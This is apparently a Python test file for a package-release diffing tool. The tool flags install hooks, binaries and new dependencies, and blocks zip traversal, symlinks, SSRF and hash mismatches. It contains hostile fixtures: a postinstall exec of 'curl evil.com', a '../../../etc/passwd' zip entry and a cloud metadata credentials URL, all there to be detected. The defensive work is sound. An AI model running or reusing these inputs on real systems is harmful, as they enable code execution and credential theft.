"""
Extended tests for activities/package_diff.py covering previously-uncovered paths:
- Pure functions: _is_noise, _safe_zip_extractall, _build_diff, _get_file_map, _extract_and_diff
- Activity-level: 404, oversized download, SHA256 mismatch, zip archives
"""
from __future__ import annotations

import hashlib
import io
import tarfile
import zipfile
from pathlib import Path
from unittest.mock import patch

import httpx
import pytest
import respx
from temporalio.exceptions import ApplicationError
from temporalio.testing import ActivityEnvironment

import json as _json

import activities.ecosystems as ecosystems_module
import activities.package_diff as pkg_diff_module
from activities.ecosystems import safe_zip_extractall as _safe_zip_extractall
from activities.ecosystems import validate_archive_url as _validate_archive_url
from activities.models import PackageSignals, DiffSignals, ReleaseAgeSignals
from activities.package_diff import (
    _added_lines_have_net_calls,
    _build_diff,
    _diff_added_lines,
    _extract_and_diff,
    _get_file_map,
    _has_binary_content,
    _is_noise,
    compute,
)
from tests.helpers import make_tar_gz as _make_tar_gz, make_zip as _make_zip

PYPI_BASE = "https://pypi.org/pypi"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _pypi_json_with_sha(package: str, version: str, url: str, sha256: str = "", pkg_type: str = "sdist", filename: str | None = None) -> dict:
    fname = filename or f"{package}-{version}.tar.gz"
    return {
        "info": {"name": package, "version": version},
        "urls": [{
            "packagetype": pkg_type,
            "url": url,
            "filename": fname,
            "digests": {"sha256": sha256},
        }],
    }


def _mock_both_versions(package: str, old_ver: str, new_ver: str, old_bytes: bytes, new_bytes: bytes, pkg_type: str = "sdist", ext: str = ".tar.gz") -> None:
    old_url = f"https://files.pythonhosted.org/{package}-{old_ver}{ext}"
    new_url = f"https://files.pythonhosted.org/{package}-{new_ver}{ext}"
    fname_old = f"{package}-{old_ver}{ext}"
    fname_new = f"{package}-{new_ver}{ext}"

    respx.get(f"{PYPI_BASE}/{package}/{old_ver}/json").mock(
        return_value=httpx.Response(200, json=_pypi_json_with_sha(package, old_ver, old_url, pkg_type=pkg_type, filename=fname_old))
    )
    respx.get(f"{PYPI_BASE}/{package}/{new_ver}/json").mock(
        return_value=httpx.Response(200, json=_pypi_json_with_sha(package, new_ver, new_url, pkg_type=pkg_type, filename=fname_new))
    )
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_bytes))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_bytes))


# ---------------------------------------------------------------------------
# _is_noise
# ---------------------------------------------------------------------------

def test_is_noise_dist_info_dir():
    assert _is_noise("requests-2.32.0.dist-info/WHEEL") is True


def test_is_noise_dist_info_suffix_variant():
    assert _is_noise("pkg.dist-info/METADATA") is True


def test_is_noise_egg_info_dir():
    assert _is_noise("pkg.egg-info/PKG-INFO") is True


def test_is_noise_pycache_dir():
    assert _is_noise("pkg/__pycache__/mod.cpython-311.pyc") is True


def test_is_noise_record_filename():
    assert _is_noise("RECORD") is True


def test_is_noise_wheel_filename():
    assert _is_noise("WHEEL") is True


def test_is_noise_pyc_suffix():
    assert _is_noise("pkg/module.pyc") is True


def test_is_noise_pyo_suffix():
    assert _is_noise("pkg/module.pyo") is True


def test_is_noise_pth_is_kept():
    assert _is_noise("easy-install.pth") is False


def test_is_noise_normal_python_file():
    assert _is_noise("pkg/utils.py") is False


def test_is_noise_setup_py():
    assert _is_noise("setup.py") is False


# ---------------------------------------------------------------------------
# _safe_zip_extractall
# ---------------------------------------------------------------------------

def test_safe_zip_path_traversal_blocked(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("../../../etc/passwd")
        zf.writestr(info, "root:x:0:0")
    buf.seek(0)
    with zipfile.ZipFile(buf) as zf:
        with pytest.raises(ApplicationError, match="path traversal"):
            _safe_zip_extractall(zf, tmp_path)


def test_safe_zip_bomb_blocked(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("legit.txt", "small content")
    buf.seek(0)
    # Patch the limit so even a small file triggers it
    with patch.object(ecosystems_module, "MAX_EXTRACT_BYTES", 5):
        with zipfile.ZipFile(buf) as zf:
            with pytest.raises(ApplicationError, match="zip bomb"):
                _safe_zip_extractall(zf, tmp_path)


def test_safe_zip_normal_extraction(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("hello.txt", "hello world")
    buf.seek(0)
    with zipfile.ZipFile(buf) as zf:
        _safe_zip_extractall(zf, tmp_path)
    assert (tmp_path / "hello.txt").read_text() == "hello world"


# ---------------------------------------------------------------------------
# _build_diff — pure logic tests using real temp dirs
# ---------------------------------------------------------------------------

def _write_files(base: Path, files: dict[str, str | bytes]) -> dict[str, Path]:
    result: dict[str, Path] = {}
    for rel, content in files.items():
        path = base / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content)
        result[rel] = path
    return result


def test_build_diff_no_changes(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
    new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 1\n"})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert result == "[no significant changes detected]"
    assert not added
    assert not changed


def test_build_diff_other_changed_file(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
    new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 2\n"})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert "CHANGED (other)" in result
    assert "pkg/utils.py" in result
    assert not added
    assert not changed


def test_build_diff_dangerous_new_binary(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/__init__.py": "x=1\n"})
    new = _write_files(tmp_path / "new", {
        "pkg/__init__.py": "x=1\n",
        "pkg/_speedups.so": b"\x7fELF",
    })
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert "DANGEROUS BINARY" in result
    assert "_speedups.so" in result
    assert "NEW:" in result


def test_build_diff_dangerous_changed_binary(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/_ext.so": b"\x7fELF old"})
    new = _write_files(tmp_path / "new", {"pkg/_ext.so": b"\x7fELF new"})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert "DANGEROUS BINARY" in result
    assert "MODIFIED:" in result
    assert "_ext.so" in result


def test_build_diff_dangerous_changed_binary_unchanged_hash_not_reported(tmp_path):
    content = b"\x7fELF identical"
    old = _write_files(tmp_path / "old", {"pkg/_ext.so": content})
    new = _write_files(tmp_path / "new", {"pkg/_ext.so": content})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert result == "[no significant changes detected]"


def test_build_diff_truncated_when_large(tmp_path):
    # __init__.py is high-signal → full unified diff is included → can exceed 100KB
    large_old = "\n".join(f"line_old_{i} = {i}" for i in range(15_000))
    large_new = "\n".join(f"line_new_{i} = {i}" for i in range(15_000))
    old = _write_files(tmp_path / "old", {"__init__.py": large_old})
    new = _write_files(tmp_path / "new", {"__init__.py": large_new})
    result, *_ = _build_diff(old, new)
    assert "truncated" in result
    assert "100KB" in result


# ---------------------------------------------------------------------------
# Install hook detection
# ---------------------------------------------------------------------------

def test_build_diff_new_setup_py_sets_added_flag(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
    new = _write_files(tmp_path / "new", {
        "pkg/utils.py": "x = 1\n",
        "setup.py": "from setuptools import setup; setup()\n",
    })
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert added is True
    assert changed is False


def test_build_diff_changed_setup_py_sets_changed_flag(tmp_path):
    old = _write_files(tmp_path / "old", {"setup.py": "from setuptools import setup; setup()\n"})
    new = _write_files(tmp_path / "new", {"setup.py": "from setuptools import setup; setup(name='evil')\n"})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert added is False
    assert changed is True


def test_build_diff_new_postinstall_js_sets_added_flag(tmp_path):
    old = _write_files(tmp_path / "old", {"index.js": "module.exports = {}\n"})
    new = _write_files(tmp_path / "new", {
        "index.js": "module.exports = {}\n",
        "postinstall.js": "require('child_process').exec('curl evil.com')\n",
    })
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert added is True


def test_build_diff_package_json_new_postinstall_script_sets_added_flag(tmp_path):
    import json as _json
    old_pkg = _json.dumps({"name": "mypkg", "version": "1.0.0", "scripts": {"test": "jest"}})
    new_pkg = _json.dumps({"name": "mypkg", "version": "1.0.1", "scripts": {"test": "jest", "postinstall": "node setup.js"}})
    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    assert added is True
    assert changed is False


def test_build_diff_package_json_changed_existing_postinstall_does_not_set_added(tmp_path):
    import json as _json
    old_pkg = _json.dumps({"scripts": {"postinstall": "node v1.js"}})
    new_pkg = _json.dumps({"scripts": {"postinstall": "node v2.js"}})
    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
    result, added, changed, _dep_count, *_ = _build_diff(old, new)
    # Key already existed — not "added", just changed content (caught by LLM diff)
    assert added is False


# ---------------------------------------------------------------------------
# _get_file_map — edge cases
# ---------------------------------------------------------------------------

def test_get_file_map_strips_single_top_level_dir(tmp_path):
    (tmp_path / "mylib-1.0.0").mkdir()
    (tmp_path / "mylib-1.0.0" / "mylib").mkdir()
    (tmp_path / "mylib-1.0.0" / "mylib" / "core.py").write_text("x=1")
    result = _get_file_map(str(tmp_path))
    assert "mylib/core.py" in result


def test_get_file_map_skips_lone_root_file(tmp_path):
    # When base contains ONE entry (a file, not a dir), strip_top=True treats
    # that filename as the "top-level dir" and skips it (len(parts)==1 branch).
    (tmp_path / "setup.cfg").write_text("[metadata]\nname=mylib")
    result = _get_file_map(str(tmp_path))
    assert "setup.cfg" not in result


def test_get_file_map_no_strip_when_multiple_top_dirs(tmp_path):
    # Multiple top-level dirs → don't strip prefix
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    (tmp_path / "a" / "file.py").write_text("x=1")
    (tmp_path / "b" / "file.py").write_text("y=2")
    result = _get_file_map(str(tmp_path))
    assert any("a" in k for k in result)


def test_get_file_map_filters_noise(tmp_path):
    # Two top-level dirs → strip_top=False → keys retain full relative path
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    (tmp_path / "a" / "code.py").write_text("x=1")
    (tmp_path / "a" / "code.pyc").write_bytes(b"bytecode")
    result = _get_file_map(str(tmp_path))
    assert "a/code.py" in result
    assert not any(".pyc" in k for k in result)


# ---------------------------------------------------------------------------
# _extract_and_diff — extraction error path
# ---------------------------------------------------------------------------

def test_extract_and_diff_bad_archive_returns_error_string():
    from activities.ecosystems.pip import PipProvider
    result, added, changed, _dep_count, *_ = _extract_and_diff(b"not a real archive", "bad.tar.gz", b"also bad", "bad2.tar.gz", PipProvider())
    assert result.startswith("[extraction error:")
    assert not added
    assert not changed


def test_extract_and_diff_unsupported_format_returns_error_string():
    from activities.ecosystems.pip import PipProvider
    result, added, changed, _dep_count, *_ = _extract_and_diff(b"data", "pkg.rpm", b"data", "pkg2.rpm", PipProvider())
    assert result.startswith("[extraction error:")


# ---------------------------------------------------------------------------
# Activity-level: 404, oversized download, SHA256 mismatch, zip archive
# ---------------------------------------------------------------------------

@respx.mock
async def test_compute_404_raises_non_retryable():
    respx.get(f"{PYPI_BASE}/missing/1.0.0/json").mock(return_value=httpx.Response(404))
    respx.get(f"{PYPI_BASE}/missing/1.1.0/json").mock(
        return_value=httpx.Response(200, json={"info": {}, "urls": []})
    )
    env = ActivityEnvironment()
    with pytest.raises(ApplicationError) as exc_info:
        await env.run(compute, "pip", "missing", "1.0.0", "1.1.0")
    assert exc_info.value.non_retryable is True


@respx.mock
async def test_compute_oversized_download_returns_stub(monkeypatch):
    old_tar = _make_tar_gz({"pkg/__init__.py": "x=1"})
    new_tar = _make_tar_gz({"pkg/__init__.py": "x=2"})
    _mock_both_versions("bigpkg", "1.0.0", "1.1.0", old_tar, new_tar)

    # Lower the limit so our small archives trigger the oversize check
    monkeypatch.setattr(pkg_diff_module, "MAX_DOWNLOAD_BYTES", 10)

    env = ActivityEnvironment()
    result = await env.run(compute, "pip", "bigpkg", "1.0.0", "1.1.0")
    assert "download aborted" in result.diff_summary
    assert result.diff_size_bytes == 0


@respx.mock
async def test_compute_sha256_mismatch_raises(monkeypatch):
    old_tar = _make_tar_gz({"pkg/__init__.py": "x=1"})
    new_tar = _make_tar_gz({"pkg/__init__.py": "x=2"})
    wrong_sha = "a" * 64  # wrong hash

    old_url = "https://files.pythonhosted.org/sha-old.tar.gz"
    new_url = "https://files.pythonhosted.org/sha-new.tar.gz"
    respx.get(f"{PYPI_BASE}/shapkg/1.0.0/json").mock(return_value=httpx.Response(
        200, json=_pypi_json_with_sha("shapkg", "1.0.0", old_url, sha256=wrong_sha, filename="sha-old.tar.gz")
    ))
    respx.get(f"{PYPI_BASE}/shapkg/1.1.0/json").mock(return_value=httpx.Response(
        200, json=_pypi_json_with_sha("shapkg", "1.1.0", new_url, sha256=wrong_sha, filename="sha-new.tar.gz")
    ))
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_tar))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_tar))

    env = ActivityEnvironment()
    with pytest.raises(ApplicationError) as exc_info:
        await env.run(compute, "pip", "shapkg", "1.0.0", "1.1.0")
    assert exc_info.value.non_retryable is True
    assert "SHA-256" in str(exc_info.value)


def test_read_text_returns_empty_on_unreadable_path(tmp_path):
    from activities.package_diff import _read_text
    # A directory is not readable as text → exception → returns ""
    assert _read_text(tmp_path) == ""


@respx.mock
async def test_compute_zip_wheel_archive():
    old_zip = _make_zip({"pkg/__init__.py": "x=1\n", "pkg/utils.py": "def f(): pass\n"})
    new_zip = _make_zip({"pkg/__init__.py": "x=2\n", "pkg/utils.py": "def f(): pass\n"})

    old_url = "https://files.pythonhosted.org/whl-1.0.0.whl"
    new_url = "https://files.pythonhosted.org/whl-1.1.0.whl"
    respx.get(f"{PYPI_BASE}/whlpkg/1.0.0/json").mock(return_value=httpx.Response(
        200, json=_pypi_json_with_sha("whlpkg", "1.0.0", old_url, pkg_type="bdist_wheel", filename="whl-1.0.0.whl")
    ))
    respx.get(f"{PYPI_BASE}/whlpkg/1.1.0/json").mock(return_value=httpx.Response(
        200, json=_pypi_json_with_sha("whlpkg", "1.1.0", new_url, pkg_type="bdist_wheel", filename="whl-1.1.0.whl")
    ))
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_zip))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_zip))

    env = ActivityEnvironment()
    result = await env.run(compute, "pip", "whlpkg", "1.0.0", "1.1.0")
    # Should have processed without errors — some content diff expected
    assert result.diff_size_bytes >= 0
    assert "[extraction error" not in result.diff_summary


# ---------------------------------------------------------------------------
# npm tarball path
# ---------------------------------------------------------------------------

NPM_REG = "https://registry.npmjs.org"


def _npm_registry_response(package: str, version: str, tarball_url: str) -> dict:
    return {
        "name": package,
        "version": version,
        "dist": {"tarball": tarball_url, "shasum": "abc123"},
    }


@respx.mock
async def test_compute_npm_tarball():
    old_tgz = _make_tar_gz({"index.js": "module.exports = 1;\n"}, top_dir="pkg-1.0.0")
    new_tgz = _make_tar_gz({"index.js": "module.exports = 2;\n"}, top_dir="pkg-1.1.0")

    old_url = "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"
    new_url = "https://registry.npmjs.org/pkg/-/pkg-1.1.0.tgz"

    respx.get(f"{NPM_REG}/pkg/1.0.0").mock(
        return_value=httpx.Response(200, json=_npm_registry_response("pkg", "1.0.0", old_url))
    )
    respx.get(f"{NPM_REG}/pkg/1.1.0").mock(
        return_value=httpx.Response(200, json=_npm_registry_response("pkg", "1.1.0", new_url))
    )
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_tgz))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_tgz))

    env = ActivityEnvironment()
    result = await env.run(compute, "npm", "pkg", "1.0.0", "1.1.0")
    assert "[extraction error" not in result.diff_summary
    assert "index.js" in result.diff_summary


@respx.mock
async def test_compute_npm_404_raises_non_retryable():
    from temporalio.exceptions import ApplicationError
    respx.get(f"{NPM_REG}/missing/1.0.0").mock(return_value=httpx.Response(404))
    respx.get(f"{NPM_REG}/missing/1.1.0").mock(return_value=httpx.Response(404))

    env = ActivityEnvironment()
    with pytest.raises(ApplicationError) as exc_info:
        await env.run(compute, "npm", "missing", "1.0.0", "1.1.0")
    assert exc_info.value.non_retryable is True


@respx.mock
async def test_compute_npm_no_tarball_returns_stub():
    respx.get(f"{NPM_REG}/nopkg/1.0.0").mock(
        return_value=httpx.Response(200, json={"name": "nopkg", "dist": {}})
    )
    respx.get(f"{NPM_REG}/nopkg/1.1.0").mock(
        return_value=httpx.Response(200, json={"name": "nopkg", "dist": {}})
    )

    env = ActivityEnvironment()
    result = await env.run(compute, "npm", "nopkg", "1.0.0", "1.1.0")
    assert "not available" in result.diff_summary


@respx.mock
async def test_is_noise_node_modules():
    assert _is_noise("node_modules/some-dep/index.js") is True


def test_is_noise_nyc_output():
    assert _is_noise(".nyc_output/coverage.json") is True


def test_is_noise_package_lock():
    assert _is_noise("package-lock.json") is True


def test_is_noise_yarn_lock():
    assert _is_noise("yarn.lock") is True


# ---------------------------------------------------------------------------
# Security: SSRF prevention — _validate_archive_url
# ---------------------------------------------------------------------------

def test_validate_archive_url_rejects_http():
    # _validate_archive_url imported at module level as alias
    from temporalio.exceptions import ApplicationError
    with pytest.raises(ApplicationError, match="only https"):
        _validate_archive_url("http://files.pythonhosted.org/pkg-1.0.0.tar.gz")


def test_validate_archive_url_rejects_untrusted_host():
    # _validate_archive_url imported at module level as alias
    from temporalio.exceptions import ApplicationError
    with pytest.raises(ApplicationError, match="Untrusted archive host"):
        _validate_archive_url("https://evil.example.com/pkg-1.0.0.tar.gz")


def test_validate_archive_url_rejects_ssrf_metadata_endpoint():
    # _validate_archive_url imported at module level as alias
    from temporalio.exceptions import ApplicationError
    with pytest.raises(ApplicationError, match="Untrusted archive host"):
        _validate_archive_url("https://169.254.169.254/latest/meta-data/iam/security-credentials/")


def test_validate_archive_url_rejects_localhost():
    # _validate_archive_url imported at module level as alias
    from temporalio.exceptions import ApplicationError
    with pytest.raises(ApplicationError, match="Untrusted archive host"):
        _validate_archive_url("https://localhost/internal-api")


def test_validate_archive_url_accepts_pythonhosted():
    # _validate_archive_url imported at module level as alias
    _validate_archive_url("https://files.pythonhosted.org/packages/pkg-1.0.0.tar.gz")


def test_validate_archive_url_accepts_npm_registry():
    # _validate_archive_url imported at module level as alias
    _validate_archive_url("https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz")


# ---------------------------------------------------------------------------
# Security: integrity verification — _verify_integrity
# ---------------------------------------------------------------------------

def test_verify_integrity_sha256_valid():
    from activities.package_diff import _verify_integrity
    data = b"hello world"
    digest = hashlib.sha256(data).hexdigest()
    _verify_integrity(data, digest, "https://files.pythonhosted.org/pkg.tar.gz")  # no exception


def test_verify_integrity_sha256_mismatch_raises():
    from activities.package_diff import _verify_integrity
    from temporalio.exceptions import ApplicationError
    with pytest.raises(ApplicationError, match="SHA-256"):
        _verify_integrity(b"tampered", "a" * 64, "https://files.pythonhosted.org/pkg.tar.gz")


def test_verify_integrity_sha512_sri_valid():
    import base64
    from activities.package_diff import _verify_integrity
    data = b"npm package content"
    digest_b64 = base64.b64encode(hashlib.sha512(data).digest()).decode()
    _verify_integrity(data, f"sha512-{digest_b64}", "https://registry.npmjs.org/pkg/-/pkg.tgz")


def test_verify_integrity_sha512_sri_mismatch_raises():
    import base64
    from activities.package_diff import _verify_integrity
    from temporalio.exceptions import ApplicationError
    bad_b64 = base64.b64encode(b"\x00" * 64).decode()
    with pytest.raises(ApplicationError, match="SHA-512"):
        _verify_integrity(b"tampered", f"sha512-{bad_b64}", "https://registry.npmjs.org/pkg.tgz")


def test_verify_integrity_unknown_format_logs_warning(caplog):
    import logging
    from activities.package_diff import _verify_integrity
    with caplog.at_level(logging.WARNING):
        _verify_integrity(b"data", "md5-abcdef", "https://registry.npmjs.org/pkg.tgz")
    assert "Unrecognised integrity format" in caplog.text


# ---------------------------------------------------------------------------
# Security: zip symlink rejection
# ---------------------------------------------------------------------------

def test_safe_zip_symlink_rejected(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("evil_link")
        # Set Unix symlink mode (0o120777 << 16) in external_attr
        info.external_attr = 0o120777 << 16
        zf.writestr(info, "/etc/passwd")  # symlink target
    buf.seek(0)
    with zipfile.ZipFile(buf) as zf:
        with pytest.raises(ApplicationError, match="symlink"):
            _safe_zip_extractall(zf, tmp_path)


# ---------------------------------------------------------------------------
# Security: npm integrity is fetched and verified end-to-end
# ---------------------------------------------------------------------------

@respx.mock
async def test_compute_npm_sri_mismatch_raises():
    import base64
    from temporalio.exceptions import ApplicationError
    old_tgz = _make_tar_gz({"index.js": "x=1"})
    new_tgz = _make_tar_gz({"index.js": "x=2"})

    bad_integrity = "sha512-" + base64.b64encode(b"\x00" * 64).decode()
    old_url = "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"
    new_url = "https://registry.npmjs.org/pkg/-/pkg-1.1.0.tgz"

    respx.get(f"{NPM_REG}/pkg/1.0.0").mock(return_value=httpx.Response(200, json={
        "name": "pkg", "dist": {"tarball": old_url, "integrity": bad_integrity}
    }))
    respx.get(f"{NPM_REG}/pkg/1.1.0").mock(return_value=httpx.Response(200, json={
        "name": "pkg", "dist": {"tarball": new_url, "integrity": bad_integrity}
    }))
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_tgz))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_tgz))

    env = ActivityEnvironment()
    with pytest.raises(ApplicationError) as exc_info:
        await env.run(compute, "npm", "pkg", "1.0.0", "1.1.0")
    assert exc_info.value.non_retryable is True
    assert "SHA-512" in str(exc_info.value)


# ---------------------------------------------------------------------------
# RubyGems helpers
# ---------------------------------------------------------------------------

RUBYGEMS_VERSIONS = "https://rubygems.org/api/v1/versions"
RUBYGEMS_GEMS = "https://rubygems.org/gems"


def _make_gem(files: dict[str, str]) -> bytes:
    """Build a minimal .gem archive (outer tar containing data.tar.gz)."""
    # Build inner data.tar.gz
    inner_buf = io.BytesIO()
    with tarfile.open(fileobj=inner_buf, mode="w:gz") as inner:
        for rel_path, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(name=rel_path)
            info.size = len(data)
            inner.addfile(info, io.BytesIO(data))
    inner_bytes = inner_buf.getvalue()

    # Build outer tar containing data.tar.gz
    outer_buf = io.BytesIO()
    with tarfile.open(fileobj=outer_buf, mode="w") as outer:
        info = tarfile.TarInfo(name="data.tar.gz")
        info.size = len(inner_bytes)
        outer.addfile(info, io.BytesIO(inner_bytes))
    outer_buf.seek(0)
    return outer_buf.read()


def _rubygems_versions_response(package: str, versions: list[tuple[str, str]]) -> list[dict]:
    """Return a RubyGems versions API response for the given (number, sha256) pairs."""
    return [
        {"number": ver, "sha": sha256, "authors": "Alice"}
        for ver, sha256 in versions
    ]


def test_extract_gem_to_dir(tmp_path):
    from activities.ecosystems.rubygems import RubyGemsProvider
    gem_bytes = _make_gem({"lib/my_gem.rb": "puts 'hello'"})
    RubyGemsProvider().extract_archive(gem_bytes, "mygem-1.0.0.gem", str(tmp_path))
    assert (tmp_path / "lib" / "my_gem.rb").exists()


def test_extract_gem_no_data_tarball_raises():
    from activities.ecosystems.rubygems import RubyGemsProvider
    import tempfile
    # Build outer tar with no data.tar.gz member
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as outer:
        data = b"not the right file"
        info = tarfile.TarInfo(name="metadata.gz")
        info.size = len(data)
        outer.addfile(info, io.BytesIO(data))
    buf.seek(0)
    with tempfile.TemporaryDirectory() as d:
        with pytest.raises(ValueError, match="No data.tar.gz"):
            RubyGemsProvider().extract_archive(buf.read(), "mygem-1.0.0.gem", d)


@respx.mock
async def test_rubygems_compute_success():
    old_gem = _make_gem({"lib/mygem.rb": "def hello; end"})
    new_gem = _make_gem({"lib/mygem.rb": "def hello; 'world'; end"})
    old_sha = hashlib.sha256(old_gem).hexdigest()
    new_sha = hashlib.sha256(new_gem).hexdigest()

    old_url = f"{RUBYGEMS_GEMS}/mygem-1.0.0.gem"
    new_url = f"{RUBYGEMS_GEMS}/mygem-1.1.0.gem"

    respx.get(f"{RUBYGEMS_VERSIONS}/mygem.json").mock(
        return_value=httpx.Response(200, json=[
            {"number": "1.0.0", "sha": old_sha, "authors": "Alice"},
            {"number": "1.1.0", "sha": new_sha, "authors": "Alice"},
        ])
    )
    respx.get(old_url).mock(return_value=httpx.Response(200, content=old_gem))
    respx.get(new_url).mock(return_value=httpx.Response(200, content=new_gem))

    env = ActivityEnvironment()
    result = await env.run(compute, "rubygems", "mygem", "1.0.0", "1.1.0")
    assert result.diff_size_bytes > 0
    assert "mygem.rb" in result.diff_summary


@respx.mock
async def test_rubygems_compute_404_raises():
    respx.get(f"{RUBYGEMS_VERSIONS}/nosuchthing.json").mock(return_value=httpx.Response(404))

    env = ActivityEnvironment()
    with pytest.raises(ApplicationError) as exc_info:
        await env.run(compute, "rubygems", "nosuchthing", "0.9.0", "1.0.0")
    assert exc_info.value.non_retryable is True


@respx.mock
async def test_rubygems_compute_version_missing_from_list_returns_stub():
    respx.get(f"{RUBYGEMS_VERSIONS}/mygem.json").mock(
        return_value=httpx.Response(200, json=[
            {"number": "1.0.0", "sha": "abc123", "authors": "Alice"},
            # 1.1.0 not present
        ])
    )

    env = ActivityEnvironment()
    result = await env.run(compute, "rubygems", "mygem", "1.0.0", "1.1.0")
    assert result.diff_summary.startswith("[")


@respx.mock
async def test_rubygems_rbc_files_are_noise():
    from activities.package_diff import _is_noise
    assert _is_noise("lib/foo.rbc") is True


def test_rubygems_bundle_is_dangerous():
    from activities.package_diff import DANGEROUS_BINARY_SUFFIXES
    assert ".bundle" in DANGEROUS_BINARY_SUFFIXES


def test_rubygems_gemspec_is_high_signal():
    from activities.package_diff import HIGH_SIGNAL_SUFFIXES
    assert ".gemspec" in HIGH_SIGNAL_SUFFIXES


def test_rubygems_rakefile_is_high_signal():
    from activities.package_diff import HIGH_SIGNAL_NAMES
    assert "Rakefile" in HIGH_SIGNAL_NAMES


# ---------------------------------------------------------------------------
# new_dependency_count — direct dependency additions
# ---------------------------------------------------------------------------

def test_build_diff_counts_new_npm_deps(tmp_path):
    old_pkg = _json.dumps({"dependencies": {"express": "^4.0.0"}, "devDependencies": {}})
    new_pkg = _json.dumps({"dependencies": {"express": "^4.0.0", "lodash": "^4.17.0", "axios": "^1.0.0"}, "devDependencies": {"jest": "^29.0.0"}})
    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
    _, _, _, dep_count, *_ = _build_diff(old, new)
    assert dep_count == 3  # lodash, axios, jest are new


def test_build_diff_counts_new_pip_deps(tmp_path):
    old_reqs = "requests>=2.0\nflask>=2.0\n"
    new_reqs = "requests>=2.0\nflask>=2.0\nboto3>=1.0\nhttpx>=0.24\nsqlalchemy>=2.0\n"
    old = _write_files(tmp_path / "old", {"requirements.txt": old_reqs})
    new = _write_files(tmp_path / "new", {"requirements.txt": new_reqs})
    _, _, _, dep_count, *_ = _build_diff(old, new)
    assert dep_count == 3  # boto3, httpx, sqlalchemy are new


def test_build_diff_dep_count_zero_when_no_manifest_changes(tmp_path):
    old = _write_files(tmp_path / "old", {"pkg/utils.py": "x = 1\n"})
    new = _write_files(tmp_path / "new", {"pkg/utils.py": "x = 2\n"})
    _, _, _, dep_count, *_ = _build_diff(old, new)
    assert dep_count == 0


def test_build_diff_dep_count_zero_when_deps_removed(tmp_path):
    old_pkg = _json.dumps({"dependencies": {"express": "^4.0.0", "lodash": "^4.0.0"}})
    new_pkg = _json.dumps({"dependencies": {"express": "^4.0.0"}})
    old = _write_files(tmp_path / "old", {"package.json": old_pkg})
    new = _write_files(tmp_path / "new", {"package.json": new_pkg})
    _, _, _, dep_count, *_ = _build_diff(old, new)
    assert dep_count == 0  # lodash removed, not added


def test_classifier_flags_large_dep_increase():
    from activities.classifier import _rule_based

    signals = PackageSignals(
        ecosystem="npm",
        package_name="mypkg",
        old_version="1.0.0",
        new_version="1.1.0",
        age=ReleaseAgeSignals(release_age_hours=500.0),
        diff=DiffSignals(diff_summary="package.json changed", diff_size_bytes=200, new_dependency_count=5),
    )
    verdict = _rule_based(signals)
    assert verdict.classification == "yellow"
    assert any("new direct dependencies" in f for f in verdict.flags)


def test_classifier_no_flag_for_small_dep_increase():
    from activities.classifier import _rule_based

    signals = PackageSignals(
        ecosystem="npm",
        package_name="mypkg",
        old_version="1.0.0",
        new_version="1.1.0",
        age=ReleaseAgeSignals(release_age_hours=500.0),
        diff=DiffSignals(diff_summary="[no significant changes]", diff_size_bytes=0, new_dependency_count=2),
    )
    verdict = _rule_based(signals)
    assert verdict.classification == "green"
    assert not any("new direct dependencies" in f for f in verdict.flags)


def test_compute_returns_new_dependency_count_field():
    """DiffSignals has new_dependency_count defaulting to 0."""
    from activities.models import DiffSignals
    sig = DiffSignals(diff_summary="ok", diff_size_bytes=10, new_dependency_count=4)
    assert sig.new_dependency_count == 4


# ---------------------------------------------------------------------------
# network_calls_in_lib — newly-added outbound HTTP calls in library code
# ---------------------------------------------------------------------------

def test_net_calls_detected_in_new_ruby_file(tmp_path):
    """A brand-new .rb file containing Net::HTTP sets network_calls_in_lib."""
    old = _write_files(tmp_path / "old", {"lib/helper.rb": "def greet; 'hello'; end\n"})
